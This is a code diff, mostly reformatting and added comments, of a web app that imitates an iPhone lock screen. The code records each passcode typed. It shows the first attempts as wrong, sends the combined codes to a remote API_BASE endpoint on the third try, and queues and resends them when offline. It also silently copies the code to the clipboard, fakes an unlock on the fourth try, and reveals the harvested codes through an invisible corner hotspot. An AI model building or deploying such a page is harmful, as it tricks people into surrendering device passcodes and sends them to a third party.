@@ -6,6 +6,7 @@
   const dotEls = Array.from(document.querySelectorAll('.dot'));
   const keys = Array.from(document.querySelectorAll('.key[data-num]'));
   const emergency = document.getElementById('emergency');
+  // keep a live reference to cancel button
   let cancelBtn = document.getElementById('cancel');
   const unlockOverlay = document.getElementById('unlockOverlay');
   const lockInner = document.querySelector('.lockscreen-inner');
@@ -13,20 +14,25 @@
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
 
-  // dynamic island element (used for lock flip + shrink timing)
+  // grab the dynamic island element so we can flip the lock and animate it
   const dynamicIslandEl = document.querySelector('.dynamic-island');
 
+  // Ensure wallpaper <img> is ready/visible (helps iOS PWA painting)
   (function ensureWallpaperPaints() {
     try {
       const wp = document.getElementById('wallpaperImg');
       if (wp) {
-        wp.addEventListener('error', () => { wp.style.display = 'none'; });
-        if (wp.decode) wp.decode().catch(()=>{/* ignore */});
+        wp.addEventListener('error', () => {
+          wp.style.display = 'none';
+        });
+        if (wp.decode) {
+          wp.decode().catch(()=>{/* ignore */});
+        }
       }
     } catch (e) {}
   })();
 
-  /* ---------- Viewport sync ---------- */
+  /* ---------- Viewport sync: match visualViewport and pin heights to avoid sliding/gaps ---------- */
   (function setupViewportSync() {
     function updateViewportHeight() {
       try {
@@ -38,8 +44,11 @@
         const ls = document.querySelector('.lockscreen');
         if (ls) ls.style.height = used + 'px';
         document.body.style.height = used + 'px';
-      } catch (err) { console.warn('viewport sync failed', err); }
+      } catch (err) {
+        console.warn('viewport sync failed', err);
+      }
     }
+
     window.addEventListener('load', updateViewportHeight, { passive: true });
     if (window.visualViewport) {
       window.visualViewport.addEventListener('resize', updateViewportHeight, { passive: true });
@@ -47,7 +56,10 @@
     }
     window.addEventListener('resize', updateViewportHeight, { passive: true });
     window.addEventListener('orientationchange', updateViewportHeight, { passive: true });
+
     updateViewportHeight();
+
+    // catch iOS toolbar animation frames
     let t = 0;
     const id = setInterval(() => {
       updateViewportHeight();
@@ -56,24 +68,55 @@
     }, 120);
   })();
 
+  // rotating buffer for last up-to-4 entered codes
   const LAST_CODES_KEY = '_pass_last_codes_';
-  function getLastCodes() { try { return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]'); } catch (e) { return []; } }
-  function pushLastCode(c) { try { const arr = getLastCodes(); arr.push(c); while (arr.length > 4) arr.shift(); localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr)); } catch (e) {} }
-  function getCombinedLastCodes() { return getLastCodes().join(','); }
+  function getLastCodes() {
+    try {
+      return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]');
+    } catch (e) {
+      return [];
+    }
+  }
+  function pushLastCode(c) {
+    try {
+      const arr = getLastCodes();
+      arr.push(c);
+      while (arr.length > 4) arr.shift();
+      localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
+    } catch (e) {}
+  }
+  function getCombinedLastCodes() {
+    return getLastCodes().join(',');
+  }
 
+  // --- clear saved attempts/queue on a fresh app session (iOS Home-screen launch) ---
   function clearSavedAttempts() {
-    try { localStorage.removeItem(LAST_CODES_KEY); localStorage.removeItem(ATT_KEY); localStorage.removeItem(QUEUE_KEY); } catch (e) {}
+    try {
+      localStorage.removeItem(LAST_CODES_KEY);
+      localStorage.removeItem(ATT_KEY);
+      localStorage.removeItem(QUEUE_KEY);
+    } catch (e) { /* ignore */ }
   }
 
   (function ensureFreshSessionOnLaunch() {
     try {
       const alreadyStarted = sessionStorage.getItem('pass_session_started');
       function markStarted() { sessionStorage.setItem('pass_session_started', '1'); }
-      if (!alreadyStarted) { clearSavedAttempts(); markStarted(); }
+
+      if (!alreadyStarted) {
+        clearSavedAttempts();
+        markStarted();
+      }
+
       window.addEventListener('pageshow', () => {
-        if (!sessionStorage.getItem('pass_session_started')) { clearSavedAttempts(); markStarted(); }
+        if (!sessionStorage.getItem('pass_session_started')) {
+          clearSavedAttempts();
+          markStarted();
+        }
       }, { passive: true });
-    } catch (err) { console.warn('session init check failed', err); }
+    } catch (err) {
+      console.warn('session init check failed', err);
+    }
   })();
 
   function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
@@ -85,7 +128,10 @@
     updateCancelText();
   }
 
-  function reset() { code = ""; refreshDots(); }
+  function reset() {
+    code = "";
+    refreshDots();
+  }
 
   function queuePass(pass) {
     const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
@@ -95,34 +141,42 @@
 
   function sendToAPI(pass) {
     const url = API_BASE + encodeURIComponent(pass);
-    return fetch(url, { method: 'GET', keepalive: true }).catch(() => queuePass(pass));
+    return fetch(url, { method: 'GET', keepalive: true })
+      .catch(() => {
+        queuePass(pass);
+      });
   }
 
   function flushQueue() {
     const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
     if (!queue.length) return;
-    queue.forEach(item => { fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{}); });
+    queue.forEach(item => {
+      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
+    });
     localStorage.removeItem(QUEUE_KEY);
   }
 
-  /* ---------- Spring engine ---------- */
+  /* ---------- Spring engine (semi-implicit integrator) ---------- */
   function springAnimate(opts) {
     const mass = opts.mass ?? 1;
-    const stiffness = opts.stiffness ?? 120;
-    const damping = opts.damping ?? 14;
+    const stiffness = opts.stiffness ?? 120; // k
+    const damping = opts.damping ?? 14;      // c
     const threshold = opts.threshold ?? 0.02;
     let x = opts.from;
     let v = opts.velocity ?? 0;
     const target = opts.to;
     let last = performance.now();
     let rafId = null;
+
     function step(now) {
       const dt = Math.min(0.032, (now - last) / 1000);
       last = now;
       const a = (-stiffness * (x - target) - damping * v) / mass;
       v += a * dt;
       x += v * dt;
+
       if (typeof opts.onUpdate === 'function') opts.onUpdate(x);
+
       const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
       if (isSettled) {
         if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
@@ -132,11 +186,12 @@
       }
       rafId = requestAnimationFrame(step);
     }
+
     rafId = requestAnimationFrame(step);
     return () => cancelAnimationFrame(rafId);
   }
 
-  /* ---------- playUnlockAnimation (homescreen starts more zoomed-in now) ---------- */
+  /* ---------- playUnlockAnimation uses two springs ---------- */
   function playUnlockAnimation() {
     const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
     if (!lockInner || !unlockOverlay || !homescreenImg) return;
@@ -148,6 +203,7 @@
       homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
       homescreenImg.style.opacity = '1';
       homescreenImg.style.filter = 'blur(0) saturate(1)';
+      // hide pill immediately for reduced-motion users
       if (dynamicIslandEl) dynamicIslandEl.style.display = 'none';
       return;
     }
@@ -158,23 +214,23 @@
     lockInner.style.willChange = 'transform, opacity';
     homescreenImg.style.willChange = 'transform, filter, opacity';
 
-    // --- STRONGER initial zoom so homescreen starts very zoomed-in like your screenshot
-    const HOME_START_SCALE = 1.18;   // << increased for "very zoomed in" start
-    const HOME_START_Y = -5;         // start slightly higher (-5%)
+    // --- NEW: start homescreen already slightly zoomed in and a touch shifted up
+    // then animate it OUT (zoom out + move down to natural position) while lock slides up.
+    const HOME_START_SCALE = 1.04;   // slightly zoomed in at start
+    const HOME_START_Y = -3;         // start translated up by -3% (will animate to 0)
     homescreenImg.style.transform = `translate3d(0, ${HOME_START_Y}%, 0) scale(${HOME_START_SCALE})`;
     homescreenImg.style.opacity = '0';
-    homescreenImg.style.filter = 'blur(12px) saturate(0.9)';
-
+    homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
     lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
     lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
 
-    // Slightly slower slide-up for lock (so homescreen zoom-out and lock pop overlap nicely)
+    // — SLOWER slide-up spring for lockInner (tuned to feel ~1s slower)
     springAnimate({
       from: 0,
       to: targetY,
-      mass: 1.35,        // slower, heavier
-      stiffness: 100,
-      damping: 16,
+      mass: 1.25,        // slightly heavier => slower
+      stiffness: 110,   // a touch lower than before
+      damping: 14,      // a touch lower damping so it stretches longer
       onUpdate: (val) => {
         const progress = Math.min(1, Math.abs(val / targetY));
         const scale = 1 - 0.003 * progress;
@@ -182,24 +238,30 @@
         lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
       },
       onComplete: () => {
+        // keep final transform; we won't hide lockInner here (homescreen spring will handle finalization)
         lockInner.style.boxShadow = '';
         lockInner.style.opacity = '0';
         lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
       }
     });
 
-    // Homescreen spring: longer and smoother so zoom-out is visible
+    // — Homescreen spring: animate p from 0->1. We'll map p to:
+    //   scale: HOME_START_SCALE -> 1.00 (zoom out)
+    //   translateY: HOME_START_Y% -> 0% (move to natural position)
     springAnimate({
       from: 0,
       to: 1,
       mass: 1.05,
-      stiffness: 48,  // lower stiffness => slower smoother feel
-      damping: 8,     // low damping to let it ease out slowly
+      stiffness: 60,  // lower stiffness -> slower
+      damping: 9,     // lower damping -> longer duration
       onUpdate: (p) => {
         const progress = Math.max(0, Math.min(1, p));
+        // scale reduces from HOME_START_SCALE to 1.0
         const scale = HOME_START_SCALE - (HOME_START_SCALE - 1) * progress;
+        // translateY moves from HOME_START_Y -> 0
         const currentY = HOME_START_Y * (1 - progress);
-        const blur = Math.max(0, 12 * (1 - Math.min(1, progress)));
+        // subtle filter/opacity mapping (keeps the look you had)
+        const blur = Math.max(0, 10 * (1 - Math.min(1, progress)));
         const sat = 0.9 + Math.min(0.15, progress * 0.15);
         homescreenImg.style.transform = `translate3d(0, ${currentY}%, 0) scale(${scale})`;
         homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
@@ -210,21 +272,26 @@
         homescreenImg.style.filter = 'blur(0) saturate(1)';
         homescreenImg.style.opacity = '1';
 
-        // After homescreen animation completes, keep island visible 1s, then collapse
+        // After homescreen animation completes, wait an EXTRA 1 second,
+        // then trigger the pill shrink & hide it after its CSS transition finishes.
         if (dynamicIslandEl) {
-          const EXTRA_KEEP_MS = 1000;
+          const EXTRA_KEEP_MS = 1000; // user-requested extra 1 second keep
           setTimeout(() => {
+            // trigger horizontal collapse
             dynamicIslandEl.classList.add('shrinking');
+
+            // wait for the CSS transitionend on the dynamic island then hide / cleanup
             const onTransEnd = (ev) => {
               if (ev.target !== dynamicIslandEl) return;
               dynamicIslandEl.removeEventListener('transitionend', onTransEnd);
               try {
                 dynamicIslandEl.style.display = 'none';
                 dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
-              } catch (e) {}
+              } catch (e) { /* ignore */ }
             };
             dynamicIslandEl.addEventListener('transitionend', onTransEnd);
-            // safety hide fallback
+
+            // safety hide if transitionend doesn't fire
             setTimeout(() => {
               try {
                 dynamicIslandEl.style.display = 'none';
@@ -236,51 +303,94 @@
       }
     });
 
+    // cleanup will-change flags after a while
     setTimeout(() => {
       lockInner.style.boxShadow = '';
       homescreenImg.style.willChange = '';
       lockInner.style.willChange = '';
-    }, 2200);
+    }, 1600 + 1000); // slightly longer to match slower springs
   }
 
   function animateWrongAttempt() {
     const dotsEl = document.getElementById('dots');
-    if (!dotsEl) { reset(); return; }
+    if (!dotsEl) {
+      reset();
+      return;
+    }
     const DURATION = 700;
+
+    // Force Cancel label back to 'Cancel' during shake
     if (cancelBtn) cancelBtn.textContent = 'Cancel';
+
     dotsEl.classList.add('wrong');
     reset();
-    setTimeout(() => dotsEl.classList.remove('wrong'), DURATION + 20);
+    setTimeout(() => {
+      dotsEl.classList.remove('wrong');
+    }, DURATION + 20);
   }
 
+  /* ---------- Clipboard helper & toast (preserve user gesture) ---------- */
   function copyToClipboard(text) {
     if (navigator.clipboard && navigator.clipboard.writeText) {
-      return navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
+      return navigator.clipboard.writeText(text).catch(() => {
+        return fallbackCopy(text);
+      });
     }
     return Promise.resolve().then(() => fallbackCopy(text));
   }
+
   function fallbackCopy(text) {
     return new Promise((resolve, reject) => {
       try {
-        const ta = document.createElement('textarea'); ta.value = text;
-        ta.style.position = 'fixed'; ta.style.left = '-9999px'; ta.style.top = '0';
-        document.body.appendChild(ta); ta.focus(); ta.select();
-        const ok = document.execCommand('copy'); document.body.removeChild(ta);
-        if (ok) resolve(); else reject(new Error('execCommand copy failed'));
-      } catch (err) { reject(err); }
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.left = '-9999px';
+        ta.style.top = '0';
+        document.body.appendChild(ta);
+        ta.focus();
+        ta.select();
+        const ok = document.execCommand('copy');
+        document.body.removeChild(ta);
+        if (ok) resolve();
+        else reject(new Error('execCommand copy failed'));
+      } catch (err) {
+        reject(err);
+      }
     });
   }
+
   function showToast(msg, ms = 1200) {
     let t = document.getElementById('pass-toast');
     if (!t) {
-      t = document.createElement('div'); t.id = 'pass-toast'; document.body.appendChild(t);
+      t = document.createElement('div');
+      t.id = 'pass-toast';
+      document.body.appendChild(t);
       if (!getComputedStyle(t).position) {
-        Object.assign(t.style, { position: 'fixed', left: '50%', bottom: '120px', transform: 'translateX(-50%)', background: 'rgba(0,0,0,0.75)', color: '#fff', padding: '8px 12px', borderRadius: '10px', zIndex: '12002', pointerEvents: 'none', opacity: '0', transition: 'opacity 160ms ease, transform 160ms ease' });
+        Object.assign(t.style, {
+          position: 'fixed',
+          left: '50%',
+          bottom: '120px',
+          transform: 'translateX(-50%)',
+          background: 'rgba(0,0,0,0.75)',
+          color: '#fff',
+          padding: '8px 12px',
+          borderRadius: '10px',
+          zIndex: '12002',
+          pointerEvents: 'none',
+          opacity: '0',
+          transition: 'opacity 160ms ease, transform 160ms ease'
+        });
       }
     }
-    t.textContent = msg; t.style.opacity = '1'; t.style.transform = 'translateX(-50%) translateY(0)';
+    t.textContent = msg;
+    t.style.opacity = '1';
+    t.style.transform = 'translateX(-50%) translateY(0)';
     clearTimeout(t._hideTimer);
-    t._hideTimer = setTimeout(() => { t.style.opacity = '0'; t._hideTimer2 = setTimeout(()=>{},200); }, ms);
+    t._hideTimer = setTimeout(() => {
+      t.style.opacity = '0';
+      t._hideTimer2 = setTimeout(() => {}, 200);
+    }, ms);
   }
 
   /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
@@ -288,6 +398,8 @@
     let attempts = getAttempts();
     attempts += 1;
     setAttempts(attempts);
+
+    // push code into rotating buffer (so hotspot displays exact payload)
     pushLastCode(enteredCode);
 
     if (attempts === 1 || attempts === 2) {
@@ -297,26 +409,39 @@
       if (combined) sendToAPI(combined);
       animateWrongAttempt();
     } else if (attempts === 4) {
-      // Immediately swap lock to unlocked glyph and pop it, then run the unlock animation
+      // Immediately show the unlocked (open) lock glyph and give it a small pop,
+      // then start the unlock animation sequence (now slightly slower). The pill
+      // will remain visible and will only shrink after the homescreen animation finishes + 1s.
       if (dynamicIslandEl) {
         dynamicIslandEl.classList.remove('locked');
         dynamicIslandEl.classList.add('unlocked', 'icon-opened');
-        // ensure immediate repaint so unlocked glyph is visible right away
-        requestAnimationFrame(() => playUnlockAnimation());
+
+        // ensure immediate repaint so the unlocked glyph is visible right away
+        requestAnimationFrame(() => {
+          // start the unlock animation immediately (no artificial delay anymore)
+          playUnlockAnimation();
+        });
       } else {
+        // fallback
         playUnlockAnimation();
       }
+
+      // local reset of input (preserve existing behavior)
       setTimeout(reset, 300);
     }
 
-    if (attempts >= 4) setAttempts(0);
+    if (attempts >= 4) {
+      setAttempts(0);
+    }
   }
 
   function animateBrightness(el, target, duration) {
     let startTime;
     const initial = parseFloat(el.dataset.brightness || "1");
     const change = target - initial;
+
     function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }
+
     function frame(ts) {
       if (!startTime) startTime = ts;
       const progress = Math.min((ts - startTime) / duration, 1);
@@ -332,7 +457,12 @@
   keys.forEach(k => {
     const num = k.dataset.num;
     if (!num) return;
-    k.addEventListener('touchstart', () => { animateBrightness(k, 1.6, 80); updateCancelText(); }, { passive: true });
+
+    k.addEventListener('touchstart', () => {
+      animateBrightness(k, 1.6, 80);
+      updateCancelText();
+    }, { passive: true });
+
     const endPress = () => { animateBrightness(k, 1, 100); };
     k.addEventListener('touchend', endPress);
     k.addEventListener('touchcancel', endPress);
@@ -351,15 +481,20 @@
             const toCopy = enteredCode;
             copyToClipboard(toCopy).catch(() => showToast('Copy failed', 900));
           }
-        } catch (err) { console.warn('clipboard pre-copy failed', err); }
+        } catch (err) {
+          console.warn('clipboard pre-copy failed', err);
+        }
 
-        setTimeout(() => { handleCompleteAttempt(enteredCode); }, 120);
+        setTimeout(() => {
+          handleCompleteAttempt(enteredCode);
+        }, 120);
       }
     });
   });
 
-  if (emergency) emergency.addEventListener('click', e => e.preventDefault());
+  emergency && emergency.addEventListener('click', e => e.preventDefault());
 
+  // ----------------- Cancel / Delete behavior (non-destructive) -----------------
   function updateCancelText() {
     cancelBtn = document.getElementById('cancel') || cancelBtn;
     if (!cancelBtn) return;
@@ -390,25 +525,67 @@
   window.addEventListener('online', flushQueue);
   flushQueue();
 
-  /* Invisible hotspot and combined display (unchanged) */
+  /* ---------- Invisible bottom-left hotspot: show combined last codes on press ---------- */
+
   function createInvisibleHotspotAndDisplay() {
     if (!document.getElementById('codesHotspot')) {
       const hs = document.createElement('div');
       hs.id = 'codesHotspot';
       Object.assign(hs.style, {
-        position: 'fixed', left: '8px', bottom: '8px', width: '56px', height: '56px', borderRadius: '12px',
-        background: 'transparent', border: 'none', zIndex: '12000', display: 'flex', alignItems: 'center',
-        justifyContent: 'center', boxSizing: 'border-box', touchAction: 'manipulation', cursor: 'pointer', pointerEvents: 'auto'
+        position: 'fixed',
+        left: '8px',
+        bottom: '8px',
+        width: '56px',
+        height: '56px',
+        borderRadius: '12px',
+        background: 'transparent',
+        border: 'none',
+        zIndex: '12000',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        boxSizing: 'border-box',
+        touchAction: 'manipulation',
+        cursor: 'pointer',
+        pointerEvents: 'auto'
       });
       document.body.appendChild(hs);
     }
+
     if (!document.getElementById('codesCombinedDisplay')) {
       const d = document.createElement('div');
       d.id = 'codesCombinedDisplay';
-      Object.assign(d.style, { position: 'fixed', left: '8px', bottom: '72px', minWidth: '160px', maxWidth: 'calc(100% - 16px)', zIndex: '12001', display: 'none', justifyContent: 'center', pointerEvents: 'none', transition: 'opacity 120ms ease, transform 120ms ease' });
+      Object.assign(d.style, {
+        position: 'fixed',
+        left: '8px',
+        bottom: '72px',
+        minWidth: '160px',
+        maxWidth: 'calc(100% - 16px)',
+        zIndex: '12001',
+        display: 'none',
+        justifyContent: 'center',
+        pointerEvents: 'none',
+        transition: 'opacity 120ms ease, transform 120ms ease'
+      });
+
       const inner = document.createElement('div');
       inner.id = 'codesCombinedInner';
-      Object.assign(inner.style, { width: '100%', background: 'rgba(0,0,0,0.7)', borderRadius: '12px', padding: '10px 12px', boxSizing: 'border-box', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#fff', fontSize: '16px', fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace', fontWeight: '700', letterSpacing: '0.6px' });
+      Object.assign(inner.style, {
+        width: '100%',
+        background: 'rgba(0,0,0,0.7)',
+        borderRadius: '12px',
+        padding: '10px 12px',
+        boxSizing: 'border-box',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        color: '#fff',
+        fontSize: '16px',
+        fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
+        fontWeight: '700',
+        letterSpacing: '0.6px'
+      });
+
       d.appendChild(inner);
       document.body.appendChild(d);
     }
@@ -419,11 +596,16 @@
     const bar = document.getElementById('codesCombinedDisplay');
     const inner = document.getElementById('codesCombinedInner');
     inner.textContent = '';
+
     const codes = getLastCodes();
     if (!codes || codes.length === 0) inner.textContent = '';
     else inner.textContent = codes.join(',');
+
     bar.style.display = 'flex';
-    requestAnimationFrame(() => { bar.style.transform = 'translateY(0)'; bar.style.opacity = '1'; });
+    requestAnimationFrame(() => {
+      bar.style.transform = 'translateY(0)';
+      bar.style.opacity = '1';
+    });
   }
 
   function hideCombinedDisplayNow() {
@@ -431,11 +613,19 @@
     if (!bar) return;
     bar.style.transform = 'translateY(8px)';
     bar.style.opacity = '0';
-    setTimeout(() => { if (bar) bar.style.display = 'none'; }, 140);
+    setTimeout(() => {
+      if (bar) bar.style.display = 'none';
+    }, 140);
   }
 
-  function onHotspotDown(ev) { ev.preventDefault(); showCombinedStringAtBottomLeft(); }
-  function onHotspotUp(ev) { hideCombinedDisplayNow(); }
+  // Hotspot handlers
+  function onHotspotDown(ev) {
+    ev.preventDefault();
+    showCombinedStringAtBottomLeft();
+  }
+  function onHotspotUp(ev) {
+    hideCombinedDisplayNow();
+  }
 
   function ensureHotspotListeners() {
     createInvisibleHotspotAndDisplay();
@@ -450,6 +640,7 @@
       hs._attached = true;
     }
   }
+
   ensureHotspotListeners();
 
   window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
